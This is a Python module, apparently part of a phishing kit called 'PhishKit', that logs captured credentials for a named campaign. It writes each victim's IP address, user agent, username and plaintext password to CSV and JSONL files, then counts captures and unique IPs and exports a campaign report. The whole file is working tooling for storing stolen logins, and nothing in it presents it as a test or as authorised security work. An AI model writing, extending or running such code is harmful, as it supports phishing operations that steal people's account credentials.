"""
PhishKit — Credential capture & reporting module
"""

import os
import json
import csv
from datetime import datetime

OUTPUT_DIR = "output"

class CaptureManager:
    def __init__(self, campaign_name="default"):
        self.campaign_name = campaign_name
        self.csv_file = os.path.join(OUTPUT_DIR, f"{campaign_name}_captures.csv")
        self.jsonl_file = os.path.join(OUTPUT_DIR, f"{campaign_name}_captures.jsonl")
        self._init_csv()

    def _init_csv(self):
        if not os.path.exists(self.csv_file):
            with open(self.csv_file, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "IP", "User-Agent", "Username", "Password", "Extra"])

    def store(self, ip, user_agent, username, password, extra=None):
        timestamp = datetime.now().isoformat()
        
        # JSONL format
        entry = {
            "timestamp": timestamp,
            "ip": ip,
            "user_agent": user_agent,
            "username": username,
            "password": password,
            "extra": extra or {}
        }
        with open(self.jsonl_file, "a") as f:
            f.write(json.dumps(entry) + "\n")

        # CSV format
        with open(self.csv_file, "a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, ip, user_agent, username, password, json.dumps(extra or {})])

    def get_stats(self):
        total = 0
        unique_ips = set()
        if os.path.exists(self.jsonl_file):
            with open(self.jsonl_file, "r") as f:
                for line in f:
                    if line.strip():
                        try:
                            entry = json.loads(line)
                            total += 1
                            unique_ips.add(entry.get("ip", ""))
                        except:
                            pass
        return {"total_captures": total, "unique_ips": len(unique_ips)}

    def export_report(self, fmt="txt"):
        stats = self.get_stats()
        report_path = os.path.join(OUTPUT_DIR, f"{self.campaign_name}_report.{fmt}")
        
        with open(report_path, "w") as f:
            f.write(f"PhishKit Campaign Report: {self.campaign_name}\n")
            f.write(f"{'='*40}\n")
            f.write(f"Total Captures: {stats['total_captures']}\n")
            f.write(f"Unique IPs: {stats['unique_ips']}\n")
            f.write(f"Report Generated: {datetime.now().isoformat()}\n")

        return report_path
